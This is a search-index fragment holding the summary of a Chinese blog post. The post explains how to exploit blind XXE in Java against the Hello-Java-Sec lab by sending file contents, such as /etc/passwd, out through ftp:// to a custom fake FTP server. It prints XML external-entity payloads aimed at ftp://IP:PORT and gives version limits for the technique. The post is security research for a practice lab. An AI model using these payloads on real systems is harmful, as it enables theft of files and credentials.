","permalink":"https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/","summary":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n关于盲XXE的文件读取 盲XXE想要读取文件一般来说需要外带。但是如果文件中包含换行等特殊字符，直接http外带，会报无效url错误。 在php环境下，可以直接使用php伪协议中的filter进行编码转换，就不会报错了。 但在java环境下或者禁用filter的情况下，可以尝试用ftp://协议外带。\n环境 这里使用的环境是Hello-Java-Sec的靶场环境 https://github.com/j3ers3/Hello-Java-Sec/\njdk8 漏洞代码： DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // 这里其实有回显，偷懒不改代码了，假装看不见。 原理 使用ftp://协议可以带出带有换行的数据。 （可利用版本：jdk\u0026lt;7u141和jdk\u0026lt;8u162，高于这两个版本ftp://协议也不能用了。）\n正常的ftp服务器不能满足我们的需要，但我从网上找到的模拟ftp服务器都不能用（也可能是我不会用），于是就自己写了一个。 链接：https://github.com/zoiltin/fake-ftp-server\n写脚本之前，先了解一下调用ftp://协议是发生了什么。通过读取/etc/passwd为例，payload：ftp://ip:port/{data}数据交互如下： 蓝色的为fake-ftp-server。 建立连接和确定模式后，服务器开始发送CWD指令，因为在/etc/passwd中有许多/将数据分割为许多目录，所以服务器一直尝试切换目录。我们要做的就是接受并不断返回250 Directory successfully changed.让服务器一直传数据。 在最后一个/后的数据，服务器将其视为要下载的文件名，请求用被动模式下载数据，从流量中可见，攻击者开启63568端口并告诉服务器，当服务器连接63568端口后，即向我们发送了要下载的文件名也就是最后一段数据。\nftp://协议比较简单，脚本很容易实现。\n用法 payload:\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file://\u0026#34;\u0026gt; \u0026lt;!ENTITY % int \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#39;ftp://IP:PORT/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; 简单的用法： ftp://IP:PORT/%file; 或者全用CWD读取： ftp://IP:PORT/%file;/ 数据中不能包含%和#，如果有'或\u0026quot;需要调整evil.dtd中包裹ftp://的引号类型，不然会报错。?和#会导致数据截断。\n在高版本也可以十分有限的利用：\nftp://username:%file;@IP:PORT/asdasd 将数据从密码处传递，只能读一行 如果文件有多行会报错，回显一部分。 ","title":"盲XXE中FTP协议的利用"}]